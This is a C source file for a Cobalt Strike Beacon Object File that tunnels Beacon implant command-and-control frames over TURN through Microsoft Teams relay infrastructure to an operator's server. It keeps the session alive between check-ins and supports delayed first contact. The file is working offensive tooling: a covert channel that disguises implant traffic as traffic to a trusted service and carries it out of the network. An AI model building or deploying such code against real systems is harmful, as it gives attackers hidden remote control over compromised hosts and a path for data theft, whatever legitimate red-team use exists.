// turn_udc2_bof.c — Cobalt Strike User-Defined C2 (UDC2) BOF that tunnels
// Beacon frames over TURN (Microsoft Teams relay infrastructure by
// default).
//
// Beacon calls go() once with a UDC2_INFO structure; we register
// udc2Proxy/udc2Close. On each check-in Beacon hands us a complete frame
// (| 4-byte little-endian length | frame data |), we carry it over TURN
// to the operator's UDC2 server and copy the response frame back.
//
// The connection is established lazily in udc2Proxy so that a payload
// can sleep arbitrarily long before its first check-in. The TURN session
// (allocation + permission) is kept alive between check-ins and rebuilt
// when it goes stale.
#include "bof_config.h"
#include "turn.h"
#include "proto.h"
#include "crypto.h"
#include "udc2.h"

static TURN_CTX gTurn;
static CHUNK_ASM gAsm;
static unsigned long gSession = 0;
static unsigned char gMsgSeq = 0;
static BOOL gBooted = FALSE;

int udc2Proxy(const char* sendBuf, int sendBufLen, char* recvBuf, int recvBufMaxLen);
void udc2Close(void);

// The UDC2 BOF entry point. Beacon passes a pointer to UDC2_INFO.
// gcc may mangle the name; the BOF loader resolves the exported symbol.
#if defined(__GNUC__)
void go(char* args, int len) __attribute__((used));
#endif

void go(char* args, int len) {
    PUDC2_INFO info = (PUDC2_INFO)args;
    (void)len;

    if (!gBooted) {
        if (crypto_rand(&gSession, sizeof(gSession)) != 0) {
            gSession = (unsigned long)GetTickCount64();
        }
        gBooted = TRUE;
    }

    info->proxyCall = udc2Proxy;
    info->proxyClose = udc2Close;
    info->version = UDC2_VERSION;
}

int udc2Proxy(const char* sendBuf, int sendBufLen, char* recvBuf, int recvBufMaxLen) {
    unsigned long long deadline = GetTickCount64() + TURN_PROXY_TIMEOUT_MS;
    unsigned char* msg;
    unsigned long msgLen;
    int r;

    if (!sendBuf || sendBufLen <= 0 || !recvBuf || recvBufMaxLen <= 0) return -1;

    if (!gTurn.alive) {
        if (turn_connect(&gTurn, deadline) != 0) return -1;
    } else if (turn_keepalive(&gTurn, deadline) != 0) {
        turn_teardown(&gTurn, 0);
        if (turn_connect(&gTurn, deadline) != 0) return -1;
    }

    if (proto_send_frame(&gTurn, gSession, gMsgSeq,
                         (const unsigned char*)sendBuf, (unsigned long)sendBufLen) != 0) {
        turn_teardown(&gTurn, 0);
        return -1;
    }

    r = proto_recv_frame(&gTurn, &gAsm, gSession, deadline, &msg, &msgLen);
    if (r != 1) {
        turn_teardown(&gTurn, 0);
        return -1;
    }

    if (msgLen > (unsigned long)recvBufMaxLen) {
        turn_teardown(&gTurn, 0);
        return -1;
    }
    if (msgLen) bof_memcpy(recvBuf, msg, msgLen);
    gMsgSeq++; // next check-in is a new message
    return (int)msgLen;
}

void udc2Close(void) {
    turn_teardown(&gTurn, 1);
    proto_asm_free(&gAsm);
    WSACleanup();
}
